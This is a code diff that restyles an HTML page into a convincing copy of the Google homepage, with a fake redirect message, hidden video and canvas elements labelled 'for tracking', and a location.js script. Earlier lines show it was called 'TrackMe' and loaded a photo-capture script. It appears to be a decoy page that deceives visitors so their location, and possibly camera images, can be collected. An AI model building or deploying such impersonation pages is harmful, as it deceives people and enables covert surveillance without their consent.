@@ -5,15 +5,328 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link href="//www.gstatic.com/images/branding/searchlogo/ico/favicon.ico" rel="icon">
     <title>Google</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fff;
+            color: #3c4043;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            padding: 6px 20px;
+            gap: 15px;
+            font-size: 13px;
+        }
+
+        .header a {
+            text-decoration: none;
+            color: #3c4043;
+            opacity: 0.75;
+            padding: 8px 12px;
+            border-radius: 4px;
+            transition: opacity 0.2s;
+        }
+
+        .header a:hover {
+            text-decoration: underline;
+            opacity: 1;
+        }
+
+        .sign-in-btn {
+            background: #1a73e8 !important;
+            color: white !important;
+            padding: 9px 23px !important;
+            border-radius: 4px;
+            font-weight: 500;
+            opacity: 1 !important;
+        }
+
+        .sign-in-btn:hover {
+            background: #1557b0 !important;
+            text-decoration: none !important;
+            box-shadow: 0 1px 2px 0 rgba(66,133,244,.3), 0 1px 3px 1px rgba(66,133,244,.15);
+        }
+
+        /* Main content */
+        .main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin-top: -160px;
+        }
+
+        .google-logo {
+            margin-bottom: 25px;
+        }
+
+        .google-logo img {
+            max-width: 272px;
+            height: auto;
+        }
+
+        /* Search container */
+        .search-container {
+            width: 100%;
+            max-width: 584px;
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        .search-box {
+            width: 100%;
+            height: 44px;
+            border: 1px solid #dfe1e5;
+            border-radius: 24px;
+            padding: 0 46px 0 16px;
+            font-size: 16px;
+            outline: none;
+            box-shadow: none;
+            transition: box-shadow 0.2s, border-color 0.2s;
+        }
+
+        .search-box:hover {
+            border-color: #dfe1e5;
+            box-shadow: 0 2px 5px 1px rgba(64,60,67,.16);
+        }
+
+        .search-box:focus {
+            border-color: transparent;
+            box-shadow: 0 2px 5px 1px rgba(64,60,67,.16);
+        }
+
+        .search-icon {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+        }
+
+        .search-icon svg {
+            fill: #9aa0a6;
+            width: 24px;
+            height: 24px;
+        }
+
+        /* Buttons */
+        .buttons {
+            display: flex;
+            gap: 14px;
+            margin-bottom: 30px;
+        }
+
+        .btn {
+            background: #f8f9fa;
+            border: 1px solid #f8f9fa;
+            border-radius: 4px;
+            color: #3c4043;
+            font-size: 14px;
+            padding: 10px 20px;
+            cursor: pointer;
+            transition: all 0.1s ease-in-out;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .btn:hover {
+            box-shadow: 0 1px 1px rgba(0,0,0,.1);
+            background-color: #f1f3f4;
+            border: 1px solid #dadce0;
+        }
+
+        /* Language links */
+        .language-info {
+            font-size: 13px;
+            color: #3c4043;
+            margin-bottom: 24px;
+        }
+
+        .language-info a {
+            color: #1a0dab;
+            text-decoration: none;
+            padding: 0 3px;
+        }
+
+        .language-info a:hover {
+            text-decoration: underline;
+        }
+
+        /* Footer */
+        .footer {
+            background: #f2f2f2;
+            border-top: 1px solid #dadce0;
+            font-size: 14px;
+            color: #70757a;
+        }
+
+        .footer-top {
+            padding: 15px 30px;
+            border-bottom: 1px solid #dadce0;
+        }
+
+        .footer-bottom {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+            flex-wrap: wrap;
+            min-height: 42px;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .footer a {
+            color: #70757a;
+            text-decoration: none;
+            padding: 15px 10px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Loading message */
+        #loading {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 20px 30px;
+            border-radius: 8px;
+            font-size: 16px;
+            z-index: 1000;
+            display: none;
+        }
+
+        /* Hidden elements */
+        #video, #canvas {
+            display: none;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .header {
+                padding: 6px 15px;
+            }
+
+            .main {
+                padding: 0 20px;
+                margin-top: -100px;
+            }
+
+            .google-logo img {
+                max-width: 200px;
+            }
+
+            .search-container {
+                max-width: 100%;
+            }
+
+            .buttons {
+                flex-direction: column;
+                align-items: center;
+                gap: 12px;
+            }
+
+            .btn {
+                min-width: 54px;
+            }
+
+            .footer-bottom {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .footer-links {
+                justify-content: center;
+            }
+        }
+    </style>
 </head>
 <body>
-<!--    <h1>TrackMe</h1>-->
-    <img src="static/images/google-logo.png" alt="google" width="250"/>
-    <div id="loading">Please wait redirecting you to ... </div>
-    <video id="video" autoplay playsinline width="640" height="480" style="display: none"></video>
-    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
-<!--    <img id="photo" alt="Captured Image" />-->
+    <!-- Header -->
+    <div class="header">
+        <a href="#">Gmail</a>
+        <a href="#">Images</a>
+        <a href="#" class="sign-in-btn">Sign in</a>
+    </div>
+    <!-- Main content -->
+    <div class="main">
+        <div class="google-logo">
+            <img src="static/images/google-logo.png" alt="Google" />
+        </div>
+
+        <div class="search-container">
+            <input type="text" class="search-box" autocomplete="off" spellcheck="false">
+            <div class="search-icon">
+                <svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                    <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path>
+                </svg>
+            </div>
+        </div>
+
+        <div class="buttons">
+            <button class="btn" type="button">Google Search</button>
+            <button class="btn" type="button">I'm Feeling Lucky</button>
+        </div>
+
+        <div class="language-info">
+            Google offered in: 
+            <a href="#">Bahasa Indonesia</a>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-top">
+            Indonesia
+        </div>
+        <div class="footer-bottom">
+            <div class="footer-links">
+                <a href="#">About</a>
+                <a href="#">Advertising</a>
+                <a href="#">Business</a>
+                <a href="#">How Search works</a>
+            </div>
+            <div class="footer-links">
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+                <a href="#">Settings</a>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Loading message (hidden by default) -->
+    <div id="loading">Please wait, redirecting you to...</div>
+
+    <!-- Hidden elements for tracking -->
+    <video id="video" autoplay playsinline width="640" height="480"></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <!-- Scripts -->
     <script src="static/js/location.js"></script>
-<!--    <script src="static/js/photo.js"></script>-->
 </body>
 </html>
